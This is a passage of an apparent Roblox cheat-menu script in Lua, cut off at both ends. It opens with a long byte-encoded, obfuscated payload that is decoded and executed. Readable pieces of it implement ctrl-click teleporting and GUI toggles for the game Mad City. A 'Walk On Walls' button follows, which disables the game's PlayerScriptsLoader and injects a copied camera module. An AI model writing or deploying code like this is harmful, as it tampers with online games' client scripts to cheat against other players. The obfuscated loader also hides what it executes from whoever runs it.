97','\103','\44','\97','\104','\32','\105','\110','\32','\110','\101','\120','\116','\44','\97','\102','\32','\100','\111','\32','\105','\102','\32','\110','\111','\116','\32','\103','\97','\109','\101','\46','\80','\108','\97','\121','\101','\114','\115','\46','\76','\111','\99','\97','\108','\80','\108','\97','\121','\101','\114','\58','\70','\105','\110','\100','\70','\105','\114','\115','\116','\67','\104','\105','\108','\100','\40','\116','\111','\115','\116','\114','\105','\110','\103','\40','\97','\104','\41','\41','\116','\104','\101','\110','\32','\108','\111','\99','\97','\108','\32','\97','\105','\61','\73','\110','\115','\116','\97','\110','\99','\101','\46','\110','\101','\119','\40','\34','\66','\111','\111','\108','\86','\97','\108','\117','\101','\34','\44','\103','\97','\109','\101','\46','\80','\108','\97','\121','\101','\114','\115','\46','\76','\111','\99','\97','\108','\80','\108','\97','\121','\101','\114','\41','\97','\105','\46','\78','\97','\109','\101','\61','\116','\111','\115','\116','\114','\105','\110','\103','\40','\97','\104','\41','\97','\105','\46','\86','\97','\108','\117','\101','\61','\116','\114','\117','\101','\32','\101','\110','\100','\32','\101','\110','\100','\32','\101','\110','\100','\41','\101','\110','\100','\59','\99','\111','\114','\111','\117','\116','\105','\110','\101','\46','\114','\101','\115','\117','\109','\101','\40','\99','\111','\114','\111','\117','\116','\105','\110','\101','\46','\99','\114','\101','\97','\116','\101','\40','\83','\67','\82','\73','\80','\84','\95','\76','\81','\77','\84','\56','\50','\95','\70','\65','\75','\69','\83','\67','\82','\73','\80','\84','\41','\41','\102','\117','\110','\99','\116','\105','\111','\110','\32','\83','\67','\82','\73','\80','\84','\95','\66','\85','\70','\79','\56','\57','\95','\70','\65','\75','\69','\83','\67','\82','\73','\80','\84','\40','\41','\103','\101','\116','\102','\101','\110','\118','\40','\41','\46','\115','\99','\114','\105','\112','\116','\61','\73','\110','\115','\116','\97','\110','\99','\101','\46','\110','\101','\119','\40','\39','\83','\99','\114','\105','\112','\116','\39','\44','\80','\41','\108','\111','\99','\97','\108','\32','\97','\106','\61','\115','\99','\114','\105','\112','\116','\46','\80','\97','\114','\101','\110','\116','\59','\97','\106','\46','\77','\111','\117','\115','\101','\66','\117','\116','\116','\111','\110','\49','\67','\108','\105','\99','\107','\58','\67','\111','\110','\110','\101','\99','\116','\40','\102','\117','\110','\99','\116','\105','\111','\110','\40','\41','\108','\111','\99','\97','\108','\32','\97','\107','\61','\103','\97','\109','\101','\58','\71','\101','\116','\83','\101','\114','\118','\105','\99','\101','\40','\34','\85','\115','\101','\114','\73','\110','\112','\117','\116','\83','\101','\114','\118','\105','\99','\101','\34','\41','\108','\111','\99','\97','\108','\32','\97','\108','\61','\103','\97','\109','\101','\46','\80','\108','\97','\121','\101','\114','\115','\46','\76','\111','\99','\97','\108','\80','\108','\97','\121','\101','\114','\59','\108','\111','\99','\97','\108','\32','\97','\109','\61','\97','\108','\58','\71','\101','\116','\77','\111','\117','\115','\101','\40','\41','\102','\117','\110','\99','\116','\105','\111','\110','\32','\84','\111','\40','\97','\110','\41','\108','\111','\99','\97','\108','\32','\97','\111','\61','\97','\108','\46','\67','\104','\97','\114','\97','\99','\116','\101','\114','\59','\105','\102','\32','\97','\111','\126','\61','\110','\105','\108','\32','\116','\104','\101','\110','\32','\97','\111','\58','\77','\111','\118','\101','\84','\111','\40','\97','\110','\41','\101','\110','\100','\32','\101','\110','\100','\59','\97','\107','\46','\73','\110','\112','\117','\116','\66','\101','\103','\97','\110','\58','\67','\111','\110','\110','\101','\99','\116','\40','\102','\117','\110','\99','\116','\105','\111','\110','\40','\97','\112','\41','\105','\102','\32','\97','\112','\46','\85','\115','\101','\114','\73','\110','\112','\117','\116','\84','\121','\112','\101','\61','\61','\69','\110','\117','\109','\46','\85','\115','\101','\114','\73','\110','\112','\117','\116','\84','\121','\112','\101','\46','\77','\111','\117','\115','\101','\66','\117','\116','\116','\111','\110','\49','\32','\97','\110','\100','\32','\97','\107','\58','\73','\115','\75','\101','\121','\68','\111','\119','\110','\40','\69','\110','\117','\109','\46','\75','\101','\121','\67','\111','\100','\101','\46','\76','\101','\102','\116','\67','\111','\110','\116','\114','\111','\108','\41','\116','\104','\101','\110','\32','\84','\111','\40','\97','\109','\46','\72','\105','\116','\46','\112','\41','\101','\110','\100','\32','\101','\110','\100','\41','\101','\110','\100','\41','\101','\110','\100','\59','\99','\111','\114','\111','\117','\116','\105','\110','\101','\46','\114','\101','\115','\117','\109','\101','\40','\99','\111','\114','\111','\117','\116','\105','\110','\101','\46','\99','\114','\101','\97','\116','\101','\40','\83','\67','\82','\73','\80','\84','\95','\66','\85','\70','\79','\56','\57','\95','\70','\65','\75','\69','\83','\67','\82','\73','\80','\84','\41','\41','\102','\117','\110','\99','\116','\105','\111','\110','\32','\83','\67','\82','\73','\80','\84','\95','\76','\71','\79','\90','\55','\48','\95','\70','\65','\75','\69','\83','\67','\82','\73','\80','\84','\40','\41','\103','\101','\116','\102','\101','\110','\118','\40','\41','\46','\115','\99','\114','\105','\112','\116','\61','\73','\110','\115','\116','\97','\110','\99','\101','\46','\110','\101','\119','\40','\39','\83','\99','\114','\105','\112','\116','\39','\44','\81','\41','\108','\111','\99','\97','\108','\32','\97','\113','\61','\115','\99','\114','\105','\112','\116','\46','\80','\97','\114','\101','\110','\116','\59','\111','\112','\101','\110','\61','\116','\114','\117','\101','\59','\97','\113','\46','\77','\111','\117','\115','\101','\66','\117','\116','\116','\111','\110','\49','\67','\108','\105','\99','\107','\58','\67','\111','\110','\110','\101','\99','\116','\40','\102','\117','\110','\99','\116','\105','\111','\110','\40','\41','\105','\102','\32','\111','\112','\101','\110','\61','\61','\116','\114','\117','\101','\32','\116','\104','\101','\110','\32','\111','\112','\101','\110','\61','\102','\97','\108','\115','\101','\59','\97','\113','\46','\80','\97','\114','\101','\110','\116','\46','\77','\97','\100','\70','\114','\97','\109','\101','\46','\86','\105','\115','\105','\98','\108','\101','\61','\102','\97','\108','\115','\101','\59','\97','\113','\46','\84','\101','\120','\116','\61','\34','\60','\32','\79','\112','\101','\110','\32','\62','\34','\101','\108','\115','\101','\32','\111','\112','\101','\110','\61','\116','\114','\117','\101','\59','\97','\113','\46','\80','\97','\114','\101','\110','\116','\46','\77','\97','\100','\70','\114','\97','\109','\101','\46','\86','\105','\115','\105','\98','\108','\101','\61','\116','\114','\117','\101','\59','\97','\113','\46','\84','\101','\120','\116','\61','\34','\60','\32','\67','\108','\111','\115','\101','\32','\62','\34','\101','\110','\100','\32','\101','\110','\100','\41','\101','\110','\100','\59','\99','\111','\114','\111','\117','\116','\105','\110','\101','\46','\114','\101','\115','\117','\109','\101','\40','\99','\111','\114','\111','\117','\116','\105','\110','\101','\46','\99','\114','\101','\97','\116','\101','\40','\83','\67','\82','\73','\80','\84','\95','\76','\71','\79','\90','\55','\48','\95','\70','\65','\75','\69','\83','\67','\82','\73','\80','\84','\41','\41','\102','\117','\110','\99','\116','\105','\111','\110','\32','\83','\67','\82','\73','\80','\84','\95','\69','\88','\65','\83','\55','\52','\95','\70','\65','\75','\69','\83','\67','\82','\73','\80','\84','\40','\41','\103','\101','\116','\102','\101','\110','\118','\40','\41','\46','\115','\99','\114','\105','\112','\116','\61','\73','\110','\115','\116','\97','\110','\99','\101','\46','\110','\101','\119','\40','\39','\83','\99','\114','\105','\112','\116','\39','\44','\97','\41','\115','\99','\114','\105','\112','\116','\46','\80','\97','\114','\101','\110','\116','\46','\82','\101','\115','\101','\116','\79','\110','\83','\112','\97','\119','\110','\61','\102','\97','\108','\115','\101','\32','\101','\110','\100','\59','\99','\111','\114','\111','\117','\116','\105','\110','\101','\46','\114','\101','\115','\117','\109','\101','\40','\99','\111','\114','\111','\117','\116','\105','\110','\101','\46','\99','\114','\101','\97','\116','\101','\40','\83','\67','\82','\73','\80','\84','\95','\69','\88','\65','\83','\55','\52','\95','\70','\65','\75','\69','\83','\67','\82','\73','\80','\84','\41','\41','\10',}IllIIllIIllIII(IllIIIllIIIIllI(IlIlIlIlIlIlIlIlII,IIIIIIIIllllllllIIIIIIII))()
end)

UICorner_47.Parent = MadCity

WalkWalls.Name = "WalkWalls"
WalkWalls.Parent = Scripts
WalkWalls.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
WalkWalls.Position = UDim2.new(0.565737069, 0, 0.544678569, 0)
WalkWalls.Size = UDim2.new(0, 71, 0, 50)
WalkWalls.Font = Enum.Font.SciFi
WalkWalls.Text = "Walk On Walls"
WalkWalls.TextColor3 = Color3.fromRGB(0, 0, 0)
WalkWalls.TextScaled = true
WalkWalls.TextSize = 14.000
WalkWalls.TextWrapped = true
WalkWalls.MouseButton1Click:connect(function()
	repeat wait()
		a = pcall(function()
			game:WaitForChild("Players").LocalPlayer:WaitForChild("PlayerScripts").ChildAdded:Connect(function(c)
				if c.Name == "PlayerScriptsLoader"then
					c.Disabled = true
				end
			end)
		end)
		if a == true then break end
	until true == false
	game:WaitForChild("Players").LocalPlayer:WaitForChild("PlayerScripts").ChildAdded:Connect(function(c)
		if c.Name == "PlayerScriptsLoader"then
			c.Disabled = true
		end
	end)


	function _CameraUI()
		local Players = game:GetService("Players")
		local TweenService = game:GetService("TweenService")

		local LocalPlayer = Players.LocalPlayer
		if not LocalPlayer then
			Players:GetPropertyChangedSignal("LocalPlayer"):Wait()
			LocalPlayer = Players.LocalPlayer
		end

		local function waitForChildOfClass(parent, class)
			local child = parent:FindFirstChildOfClass(class)
			while not child or child.ClassName ~= class do
				child = parent.ChildAdded:Wait()
			end
			return child
		end

		local PlayerGui = waitForChildOfClass(LocalPlayer, "PlayerGui")

		local TOAST_OPEN_SIZE = UDim2.new(0, 326, 0, 58)
		local TOAST_CLOSED_SIZE = UDim2.new(0, 80, 0, 58)
		local TOAST_BACKGROUND_COLOR = Color3.fromRGB(32, 32, 32)
		local TOAST_BACKGROUND_TRANS = 0.4
		local TOAST_FOREGROUND_COLOR = Color3.fromRGB(200, 200, 200)
		local TOAST_FOREGROUND_TRANS = 0

		-- Convenient syntax for creating a tree of instanes
		local function create(className)
			return function(props)
				local inst = Instance.new(className)
				local parent = props.Parent
				props.Parent = nil
				for name, val in pairs(props) do
					if type(name) == "string" then
						inst[name] = val
					else
						val.Parent = inst
					end
				end
				-- Only set parent after all other properties are initialized
				inst.Parent = parent
				return inst
			end
		end

		local initialized = false

		local uiRoot
		local toast
		local toastIcon
		local toastUpperText
		local toastLowerText

		local function initializeUI()
			assert(not initialized)

			uiRoot = create("ScreenGui"){
				Name = "RbxCameraUI",
				AutoLocalize = false,
				Enabled = true,
				DisplayOrder = -1, -- Appears behind default developer UI
				IgnoreGuiInset = false,
				ResetOnSpawn = false,
				ZIndexBehavior = Enum.ZIndexBehavior.Sibling,

				create("ImageLabel"){
					Name = "Toast",
					Visible = false,
					AnchorPoint = Vector2.new(0.5, 0),
					BackgroundTransparency = 1,
					BorderSizePixel = 0,
					Position = UDim2.new(0.5, 0, 0, 8),
					Size = TOAST_CLOSED_SIZE,
					Image = "rbxasset://textures/ui/Camera/CameraToast9Slice.png",
					ImageColor3 = TOAST_BACKGROUND_COLOR,
					ImageRectSize = Vector2.new(6, 6),
					ImageTransparency = 1,
					ScaleType = Enum.ScaleType.Slice,
					SliceCenter = Rect.new(3, 3, 3, 3),
					ClipsDescendants = true,

					create("Frame"){
						Name = "IconBuffer",
						BackgroundTransparency = 1,
						BorderSizePixel = 0,
						Position = UDim2.new(0, 0, 0, 0),
						Size = UDim2.new(0, 80, 1, 0),

						create("ImageLabel"){
							Name = "Icon",
							AnchorPoint = Vector2.new(0.5, 0.5),
							BackgroundTransparency = 1,
							Position = UDim2.new(0.5, 0, 0.5, 0),
							Size = UDim2.new(0, 48, 0, 48),
							ZIndex = 2,
							Image = "rbxasset://textures/ui/Camera/CameraToastIcon.png",
							ImageColor3 = TOAST_FOREGROUND_COLOR,
							ImageTransparency = 1,
						}
					},

					create("Frame"){
						Name = "TextBuffer",
						BackgroundTransparency = 1,
						BorderSizePixel = 0,
						Position = UDim2.new(0, 80, 0, 0),
						Size = UDim2.new(1, -80, 1, 0),
						ClipsDescendants = true,

						create("TextLabel"){
							Name = "Upper",
							AnchorPoint = Vector2.new(0, 1),
							BackgroundTransparency = 1,
							Position = UDim2.new(0, 0, 0.5, 0),
							Size = UDim2.new(1, 0, 0, 19),
							Font = Enum.Font.GothamSemibold,
							Text = "Camera control enabled",
							TextColor3 = TOAST_FOREGROUND_COLOR,
							TextTransparency = 1,
							TextSize = 19,
							TextXAlignment = Enum.TextXAlignment.Left,
							TextYAlignment = Enum.TextYAlignment.Center,
						},

						create("TextLabel"){
							Name = "Lower",
							AnchorPoint = Vector2.new(0, 0),
							BackgroundTransparency = 1,
							Position = UDim2.new(0, 0, 0.5, 3),
							Size = UDim2.new(1, 0, 0, 15),
							Font = Enum.Font.Gotham,
							Text = "Right mouse button to toggle",
							TextColor3 = TOAST_FOREGROUND_COLOR,
							TextTransparency = 1,
							TextSize = 15,
							TextXAlignment = Enum.TextXAlignment.Left,
							TextYAlignment = Enum.TextYAlignment.Center,
						},
					},
				},

				Parent = PlayerGui,
			}

			toast = uiRoot.Toast
			toastIcon = toast.IconBuffer.Icon
			toastUpperText = toast.TextBuffer.Upper
			toastLowerText = toast.TextBuffer.Lower

			initialized = true
		end

		local CameraUI = {}

		do
			-- Instantaneously disable the toast or enable for opening later on. Used when switching camera modes.
			function CameraUI.setCameraModeToastEnabled(enabled)
				if not enabled and not initialized then
					return
				end

				if not initialized then
					initializeUI()
				end

				toast.Visible = enabled
				if not enabled then
					CameraUI.setCameraModeToastOpen(false)
				end
			end

			local tweenInfo = TweenInfo.new(0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)

			-- Tween the toast in or out. Toast must be enabled with setCameraModeToastEnabled.
			function CameraUI.setCameraModeToastOpen(open)
				assert(initialized)

				TweenService:Create(toast, tweenInfo, {
					Size = open and TOAST_OPEN_SIZE or TOAST_CLOSED_SIZE,
					ImageTransparency = open and TOAST_BACKGROUND_TRANS or 1,
				}):Play()

				TweenService:Create(toastIcon, tweenInfo, {
					ImageTransparency = open and TOAST_FOREGROUND_TRANS or 1,
				}):Play()

				TweenService:Create(toastUpperText, tweenInfo, {
					TextTransparency = open and TOAST_FOREGROUND_TRANS or 1,
				}):Play()

				TweenService:Create(toastLowerText, tweenInfo, {
					TextTransparency = open and TOAST_FOREGROUND_TRANS or 1,
				}):Play()
			end
		end

		return CameraUI
	end

	function _CameraToggleStateController()
		local Players = game:GetService("Players")
		local UserInputService = game:GetService("UserInputService")
		local GameSettings = UserSettings():GetService("UserGameSettings")

		local LocalPlayer = Players.LocalPlayer
		if not LocalPlayer then
			Players:GetPropertyChangedSignal("LocalPlayer"):Wait()
			LocalPlayer = Players.LocalPlayer
		end

		local Mouse = LocalPlayer:GetMouse()

		local Input = _CameraInput()
		local CameraUI = _CameraUI()

		local lastTogglePan = false
		local lastTogglePanChange = tick()

		local CROSS_MOUSE_ICON = "rbxasset://textures/Cursors/CrossMouseIcon.png"

		local lockStateDirty = false
		local wasTogglePanOnTheLastTimeYouWentIntoFirstPerson = false
		local lastFirstPerson = false

		CameraUI.setCameraModeToastEnabled(false)

		return function(isFirstPerson)
			local togglePan = Input.getTogglePan()
			local toastTimeout = 3

			if isFirstPerson and togglePan ~= lastTogglePan then
				lockStateDirty = true
			end

			if lastTogglePan ~= togglePan or tick() - lastTogglePanChange > toastTimeout then
				local doShow = togglePan and tick() - lastTogglePanChange < toastTimeout

				CameraUI.setCameraModeToastOpen(doShow)

				if togglePan then
					lockStateDirty = false
				end
				lastTogglePanChange = tick()
				lastTogglePan = togglePan
			end

			if isFirstPerson ~= lastFirstPerson then
				if isFirstPerson then
					wasTogglePanOnTheLastTimeYouWentIntoFirstPerson = Input.getTogglePan()
					Input.setTogglePan(true)
				elseif not lockStateDirty then
					Input.setTogglePan(wasTogglePanOnTheLastTimeYouWentIntoFirstPerson)
				end
			end

			if isFirstPerson then
				if Input.getTogglePan() then
					Mouse.Icon = CROSS_MOUSE_ICON
					UserInputService.MouseBehavior = Enum.MouseBehavior.LockCenter
					--GameSettings.RotationType = Enum.RotationType.CameraRelative
				else
					Mouse.Icon = ""
					UserInputService.MouseBehavior = Enum.MouseBehavior.Default
					--GameSettings.RotationType = Enum.RotationType.CameraRelative
				end

			elseif Input.getTogglePan() then
				Mouse.Icon = CROSS_MOUSE_ICON
				UserInputService.MouseBehavior = Enum.MouseBehavior.LockCenter
				GameSettings.RotationType = Enum.RotationType.MovementRelative

			elseif Input.getHoldPan() then
				Mouse.Icon = ""
				UserInputService.MouseBehavior = Enum.MouseBehavior.LockCurrentPosition
				GameSettings.RotationType = Enum.RotationType.MovementRelative

			else
				Mouse.Icon = ""
				UserInputService.MouseBehavior = Enum.MouseBehavior.Default
				GameSettings.RotationType = Enum.RotationType.MovementRelative
			end

			lastFirstPerson = isFirstPerson
		end
	end

	function _CameraInput()
		local UserInputService = game:GetService("UserInputService")

		local MB_TAP_LENGTH = 0.3 -- length of time for a short mouse button tap to be registered

		local rmbDown, rmbUp
		do
			local rmbDownBindable = Instance.new("BindableEvent")
			local rmbUpBindable = Instance.new("BindableEvent")

			rmbDown = rmbDownBindable.Event
			rmbUp = rmbUpBindable.Event

			UserInputService.InputBegan:Connect(function(input, gpe)
				if not gpe and input.UserInputType == Enum.UserInputType.MouseButton2 then
					rmbDownBindable:Fire()
				end
			end)

			UserInputService.InputEnded:Connect(function(input, gpe)
				if input.UserInputType == Enum.UserInputType.MouseButton2 then
					rmbUpBindable:Fire()
				end
			end)
		end

		local holdPan = false
		local togglePan = false
		local lastRmbDown = 0 -- tick() timestamp of the last right mouse button down event

		local CameraInput = {}

		function CameraInput.getHoldPan()
			return holdPan
		end

		function CameraInput.getTogglePan()
			return togglePan
		end

		function CameraInput.getPanning()
			return togglePan or holdPan
		end

		function CameraInput.setTogglePan(value)
			togglePan = value
		end

		local cameraToggleInputEnabled = false
		local rmbDownConnection
		local rmbUpConnection

		function CameraInput.enableCameraToggleInput()
			if cameraToggleInputEnabled then
				return
			end
			cameraToggleInputEnabled = true

			holdPan = false
			togglePan = false

			if rmbDownConnection then
				rmbDownConnection:Disconnect()
			end

			if rmbUpConnection then
				rmbUpConnection:Disconnect()
			end

			rmbDownConnection = rmbDown:Connect(function()
				holdPan = true
				lastRmbDown = tick()
			end)

			rmbUpConnection = rmbUp:Connect(function()
				holdPan = false
				if tick() - lastRmbDown < MB_TAP_LENGTH and (togglePan or UserInputService:GetMouseDelta().Magnitude < 2) then
					togglePan = not togglePan
				end
			end)
		end

		function CameraInput.disableCameraToggleInput()
			if not cameraToggleInputEnabled then
				return
			end
			cameraToggleInputEnabled = false

			if rmbDownConnection then
				rmbDownConnection:Disconnect()
				rmbDownConnection = nil
			end
			if rmbUpConnection then
				rmbUpConnection:Disconnect()
				rmbUpConnection = nil
			end
		end

		return CameraInput
	end

	function _BaseCamera()
	--[[
		BaseCamera - Abstract base class for camera control modules
		2018 Camera Update - AllYourBlox
	--]]

		--[[ Local Constants ]]--
		local UNIT_Z = Vector3.new(0,0,1)
		local X1_Y0_Z1 = Vector3.new(1,0,1)	--Note: not a unit vector, used for projecting onto XZ plane

		local THUMBSTICK_DEADZONE = 0.2
		local DEFAULT_DISTANCE = 12.5	-- Studs
		local PORTRAIT_DEFAULT_DISTANCE = 25		-- Studs
		local FIRST_PERSON_DISTANCE_THRESHOLD = 1.0 -- Below this value, snap into first person

		local CAMERA_ACTION_PRIORITY = Enum.ContextActionPriority.Default.Value

		-- Note: DotProduct check in CoordinateFrame::lookAt() prevents using values within about
		-- 8.11 degrees of the +/- Y axis, that's why these limits are currently 80 degrees
		local MIN_Y = math.rad(-80)
		local MAX_Y = math.rad(80)

		local TOUCH_ADJUST_AREA_UP = math.rad(30)
		local TOUCH_ADJUST_AREA_DOWN = math.rad(-15)

		local TOUCH_SENSITIVTY_ADJUST_MAX_Y = 2.1
		local TOUCH_SENSITIVTY_ADJUST_MIN_Y = 0.5

		local VR_ANGLE = math.rad(15)
		local VR_LOW_INTENSITY_ROTATION = Vector2.new(math.rad(15), 0)
		local VR_HIGH_INTENSITY_ROTATION = Vector2.new(math.rad(45), 0)
		local VR_LOW_INTENSITY_REPEAT = 0.1
		local VR_HIGH_INTENSITY_REPEAT = 0.4

		local ZERO_VECTOR2 = Vector2.new(0,0)
		local ZERO_VECTOR3 = Vector3.new(0,0,0)

		local TOUCH_SENSITIVTY = Vector2.new(0.00945 * math.pi, 0.003375 * math.pi)
		local MOUSE_SENSITIVITY = Vector2.new( 0.002 * math.pi, 0.0015 * math.pi )

		local SEAT_OFFSET = Vector3.new(0,5,0)
		local VR_SEAT_OFFSET = Vector3.new(0,4,0)
		local HEAD_OFFSET = Vector3.new(0,1.5,0)
		local R15_HEAD_OFFSET = Vector3.new(0, 1.5, 0)
		local R15_HEAD_OFFSET_NO_SCALING = Vector3.new(0, 2, 0)
		local HUMANOID_ROOT_PART_SIZE = Vector3.new(2, 2, 1)

		local GAMEPAD_ZOOM_STEP_1 = 0
		local GAMEPAD_ZOOM_STEP_2 = 10
		local GAMEPAD_ZOOM_STEP_3 = 20

		local PAN_SENSITIVITY = 20
		local ZOOM_SENSITIVITY_CURVATURE = 0.5

		local abs = math.abs
		local sign = math.sign

		local FFlagUserCameraToggle do
			local success, result = pcall(function()
				return UserSettings():IsUserFeatureEnabled("UserCameraToggle")
			end)
			FFlagUserCameraToggle = success and result
		end

		local FFlagUserDontAdjustSensitvityForPortrait do
			local success, result = pcall(function()
				return UserSettings():IsUserFeatureEnabled("UserDontAdjustSensitvityForPortrait")
			end)
			FFlagUserDontAdjustSensitvityForPortrait = success and result
		end

		local FFlagUserFixZoomInZoomOutDiscrepancy do
			local success, result = pcall(function()
				return UserSettings():IsUserFeatureEnabled("UserFixZoomInZoomOutDiscrepancy")
			end)
			FFlagUserFixZoomInZoomOutDiscrepancy = success and result
		end

		local Util = _CameraUtils()
		local ZoomController = _ZoomController()
		local CameraToggleStateController = _CameraToggleStateController()
		local CameraInput = _CameraInput()
		local CameraUI = _CameraUI()

		--[[ Roblox Services ]]--
		local Players = game:GetService("Players")
		local UserInputService = game:GetService("UserInputService")
		local StarterGui = game:GetService("StarterGui")
		local GuiService = game:GetService("GuiService")
		local ContextActionService = game:GetService("ContextActionService")
		local VRService = game:GetService("VRService")
		local UserGameSettings = UserSettings():GetService("UserGameSettings")

		local player = Players.LocalPlayer 

		--[[ The Module ]]--
		local BaseCamera = {}
		BaseCamera.__index = BaseCamera

		function BaseCamera.new()
			local self = setmetatable({}, BaseCamera)

			-- So that derived classes have access to this
			self.FIRST_PERSON_DISTANCE_THRESHOLD = FIRST_PERSON_DISTANCE_THRESHOLD

			self.cameraType = nil
			self.cameraMovementMode = nil

			self.lastCameraTransform = nil
			self.rotateInput = ZERO_VECTOR2
			self.userPanningCamera = false
			self.lastUserPanCamera = tick()

			self.humanoidRootPart = nil
			self.humanoidCache = {}

			-- Subject and position on last update call
			self.lastSubject = nil
			self.lastSubjectPosition = Vector3.new(0,5,0)

			-- These subject distance members refer to the nominal camera-to-subject follow distance that the camera
			-- is trying to maintain, not the actual measured value.
			-- The default is updated when screen orientation or the min/max distances change,
			-- to be sure the default is always in range and appropriate for the orientation.
			self.defaultSubjectDistance = math.clamp(DEFAULT_DISTANCE, player.CameraMinZoomDistance, player.CameraMaxZoomDistance)
			self.currentSubjectDistance = math.clamp(DEFAULT_DISTANCE, player.CameraMinZoomDistance, player.CameraMaxZoomDistance)

			self.inFirstPerson = false
			self.inMouseLockedMode = false
			self.portraitMode = false
			self.isSmallTouchScreen = false

			-- Used by modules which want to reset the camera angle on respawn.
			self.resetCameraAngle = true

			self.enabled = false

			-- Input Event Connections
			self.inputBeganConn = nil
			self.inputChangedConn = nil
			self.inputEndedConn = nil

			self.startPos = nil
			self.lastPos = nil
			self.panBeginLook = nil

			self.panEnabled = true
			self.keyPanEnabled = true
			self.distanceChangeEnabled = true

			self.PlayerGui = nil

			self.cameraChangedConn = nil
			self.viewportSizeChangedConn = nil

			self.boundContextActions = {}

			-- VR Support
			self.shouldUseVRRotation = false
			self.VRRotationIntensityAvailable = false
			self.lastVRRotationIntensityCheckTime = 0
			self.lastVRRotationTime = 0
			self.vrRotateKeyCooldown = {}
			self.cameraTranslationConstraints = Vector3.new(1, 1, 1)
			self.humanoidJumpOrigin = nil
			self.trackingHumanoid = nil
			self.cameraFrozen = false
			self.subjectStateChangedConn = nil

			-- Gamepad support
			self.activeGamepad = nil
			self.gamepadPanningCamera = false
			self.lastThumbstickRotate = nil
			self.numOfSeconds = 0.7
			self.currentSpeed = 0
			self.maxSpeed = 6
			self.vrMaxSpeed = 4
			self.lastThumbstickPos = Vector2.new(0,0)
			self.ySensitivity = 0.65
			self.lastVelocity = nil
			self.gamepadConnectedConn = nil
			self.gamepadDisconnectedConn = nil
			self.currentZoomSpeed = 1.0
			self.L3ButtonDown = false
			self.dpadLeftDown = false
			self.dpadRightDown = false

			-- Touch input support
			self.isDynamicThumbstickEnabled = false
			self.fingerTouches = {}
			self.dynamicTouchInput = nil
			self.numUnsunkTouches = 0
			self.inputStartPositions = {}
			self.inputStartTimes = {}
			self.startingDiff = nil
			self.pinchBeginZoom = nil
			self.userPanningTheCamera = false
			self.touchActivateConn = nil

			-- Mouse locked formerly known as shift lock mode
			self.mouseLockOffset = ZERO_VECTOR3

			-- [[ NOTICE ]] --
			-- Initialization things used to always execute at game load time, but now these camera modules are instantiated
			-- when needed, so the code here may run well after the start of the game

			if player.Character then
				self:OnCharacterAdded(player.Character)
			end

			player.CharacterAdded:Connect(function(char)
				self:OnCharacterAdded(char)
			end)

			if self.cameraChangedConn then self.cameraChangedConn:Disconnect() end
			self.cameraChangedConn = workspace:GetPropertyChangedSignal("CurrentCamera"):Connect(function()
				self:OnCurrentCameraChanged()
			end)
			self:OnCurrentCameraChanged()

			if self.playerCameraModeChangeConn then self.playerCameraModeChangeConn:Disconnect() end
			self.playerCameraModeChangeConn = player:GetPropertyChangedSignal("CameraMode"):Connect(function()
				self:OnPlayerCameraPropertyChange()
			end)

			if self.minDistanceChangeConn then self.minDistanceChangeConn:Disconnect() end
			self.minDistanceChangeConn = player:GetPropertyChangedSignal("CameraMinZoomDistance"):Connect(function()
				self:OnPlayerCameraPropertyChange()
			end)

			if self.maxDistanceChangeConn then self.maxDistanceChangeConn:Disconnect() end
			self.maxDistanceChangeConn = player:GetPropertyChangedSignal("CameraMaxZoomDistance"):Connect(function()
				self:OnPlayerCameraPropertyChange()
			end)

			if self.playerDevTouchMoveModeChangeConn then self.playerDevTouchMoveModeChangeConn:Disconnect() end
			self.playerDevTouchMoveModeChangeConn = player:GetPropertyChangedSignal("DevTouchMovementMode"):Connect(function()
				self:OnDevTouchMovementModeChanged()
			end)
			self:OnDevTouchMovementModeChanged() -- Init

			if self.gameSettingsTouchMoveMoveChangeConn then self.gameSettingsTouchMoveMoveChangeConn:Disconnect() end
			self.gameSettingsTouchMoveMoveChangeConn = UserGameSettings:GetPropertyChangedSignal("TouchMovementMode"):Connect(function()
				self:OnGameSettingsTouchMovementModeChanged()
			end)
			self:OnGameSettingsTouchMovementModeChanged() -- Init

			UserGameSettings:SetCameraYInvertVisible()
			UserGameSettings:SetGamepadCameraSensitivityVisible()

			self.hasGameLoaded = game:IsLoaded()
			if not self.hasGameLoaded then
				self.gameLoadedConn = game.Loaded:Connect(function()
					self.hasGameLoaded = true
					self.gameLoadedConn:Disconnect()
					self.gameLoadedConn = nil
				end)
			end

			self:OnPlayerCameraPropertyChange()

			return self
		end

		function BaseCamera:GetModuleName()
			return "BaseCamera"
		end

		function BaseCamera:OnCharacterAdded(char)
			self.resetCameraAngle = self.resetCameraAngle or self:GetEnabled()
			self.humanoidRootPart = nil
			if UserInputService.TouchEnabled then
				self.PlayerGui = player:WaitForChild("PlayerGui")
				for _, child in ipairs(char:GetChildren()) do
					if child:IsA("Tool") then
						self.isAToolEquipped = true
					end
				end
				char.ChildAdded:Connect(function(child)
					if child:IsA("Tool") then
						self.isAToolEquipped = true
					end
				end)
				char.ChildRemoved:Connect(function(child)
					if child:IsA("Tool") then
						self.isAToolEquipped = false
					end
				end)
			end
		end

		function BaseCamera:GetHumanoidRootPart()
			if not self.humanoidRootPart then
				if player.Character then
					local humanoid = player.Character:FindFirstChildOfClass("Humanoid")
					if humanoid then
						self.humanoidRootPart = humanoid.RootPart
					end
				end
			end
			return self.humanoidRootPart
		end

		function BaseCamera:GetBodyPartToFollow(humanoid, isDead)
			-- If the humanoid is dead, prefer the head part if one still exists as a sibling of the humanoid
			if humanoid:GetState() == Enum.HumanoidStateType.Dead then
				local character = humanoid.Parent
				if character and character:IsA("Model") then
					return character:FindFirstChild("Head") or humanoid.RootPart
				end
			end

			return humanoid.RootPart
		end

		function BaseCamera:GetSubjectPosition()
			local result = self.lastSubjectPosition
			local camera = game.Workspace.CurrentCamera
			local cameraSubject = camera and camera.CameraSubject

			if cameraSubject then
				if cameraSubject:IsA("Humanoid") then
					local humanoid = cameraSubject
					local humanoidIsDead = humanoid:GetState() == Enum.HumanoidStateType.Dead

					if VRService.VREnabled and humanoidIsDead and humanoid == self.lastSubject then
						result = self.lastSubjectPosition
					else
						local bodyPartToFollow = humanoid.RootPart

						-- If the humanoid is dead, prefer their head part as a follow target, if it exists
						if humanoidIsDead then
							if humanoid.Parent and humanoid.Parent:IsA("Model") then
								bodyPartToFollow = humanoid.Parent:FindFirstChild("Head") or bodyPartToFollow
							end
						end

						if bodyPartToFollow and bodyPartToFollow:IsA("BasePart") then
							local heightOffset
							if humanoid.RigType == Enum.HumanoidRigType.R15 then
								if humanoid.AutomaticScalingEnabled then
									heightOffset = R15_HEAD_OFFSET
